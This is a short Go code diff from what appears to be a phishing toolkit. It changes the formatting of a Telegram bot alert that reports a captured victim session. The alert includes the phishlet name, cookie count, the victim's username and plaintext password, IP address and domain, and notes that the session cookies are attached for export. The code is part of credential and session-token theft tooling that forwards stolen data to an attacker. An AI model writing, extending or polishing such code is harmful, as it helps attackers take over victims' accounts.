@@ -193,14 +193,14 @@ func (t *TelegramBot) SendTokensCapture(sessionID int, username, password, ip, d
 	}
 
 	message := fmt.Sprintf(
-		"%s capture\n\n"+
-			"📊 Status: Tokens Captured\n\n"+
-			"🍪 Cookies: %d\n\n"+
-			"📧 Username: %s\n\n"+
-			"🔑 Password: %s\n\n"+
-			"🌐 IP: %s\n\n"+
-			"🌐 Domain: %s\n\n"+
-			"📎 cookies attached",
+		"🚨 *%s Token Capture* 🚨\n\n"+
+			"📊 *Status:* Tokens Captured\n"+
+			"🍪 *Cookies:* %d\n"+
+			"🔐 *Username:* %s\n"+
+			"🔑 *Password:* %s\n"+
+			"🌐 *IP Address:* %s\n"+
+			"🔗 *Domain:* %s\n\n"+
+			"📝 *Note:* Cookies are attached and ready for export",
 		phishletName,
 		cookieCount,
 		escapeMarkdownV2(username),
